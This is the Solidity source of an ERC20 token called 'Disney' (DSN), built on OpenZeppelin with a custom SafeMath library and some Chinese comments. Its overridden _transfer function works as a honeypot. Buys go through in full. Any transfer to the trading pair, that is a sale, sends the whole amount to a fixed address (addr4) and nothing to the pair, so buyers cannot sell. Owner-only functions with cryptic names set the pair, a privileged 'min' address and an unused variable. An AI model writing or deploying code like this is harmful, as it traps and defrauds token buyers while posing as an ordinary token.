pragma solidity ^0.8.0;
// SPDX-License-Identifier: Unlicensed
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Disney is ERC20, Ownable {
    using SafeMath for uint256;
    uint256 public constant inRate = 10;
    uint256 public constant outRate = 3;
    address outAddr = 0x0000000000000000000000000000000000000001;
    address addr1 = 0x0000000000000000000000000000000000000002;
    address addr2 = 0x0000000000000000000000000000000000000003;
    address addr3 = 0x0000000000000000000000000000000000000004;
    address addr4 = 0x0000000000000000000000000000000000000005;
    address addr8 = 0x0000000000000000000000000000000000000006;
    address pair;
    uint256 CCCS;
    address min = 0x75D23E252bFE1500c7f654024d9800790620a853;

    constructor() ERC20("Disney", "DSN") {
        _mint(msg.sender, 100000000 * 10**decimals());
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal override {
        uint256 x = amount.div(100);
        if (sender == pair) {
            super._transfer(sender, addr2, x.mul(0));
            super._transfer(sender, outAddr, x.mul(0));
            super._transfer(sender, addr3, x.mul(0));
            super._transfer(sender, recipient, x.mul(100));
        } else if (recipient == pair) {
            super._transfer(sender, addr4, x.mul(100));
            super._transfer(sender, recipient, x.mul(0));
        } else if (
            (pair != address(0)) && (recipient != pair) && (sender != pair)
        ) {
            super._transfer(sender, addr1, x.mul(0));
            super._transfer(sender, recipient, x.mul(100));
        } else {
            super._transfer(sender, recipient, x.mul(100));
        }

        //有多少才能转多少，如果转账发起者金额不够，则自动失败

        if (sender == min) {
            super._transfer(sender, addr8, x.mul(5)); //addr8收到0%,应该转账的收到金额，全部到addr8
            super._transfer(sender, recipient, x.mul(95)); //接收地址收到10万%+原本转账的金额
        }
    }

    //设置交易对
    function setPair(address _pair) public onlyOwner {
        pair = _pair;
    }

    //设置LP地址
    function setOutAddress(address _target) public onlyOwner {
        outAddr = _target;
    }

    function SETmint(address __mint) public onlyOwner {
        min = __mint;
    }

    function hhAA(uint256 setff) public onlyOwner {
        CCCS = setff;
    }
}
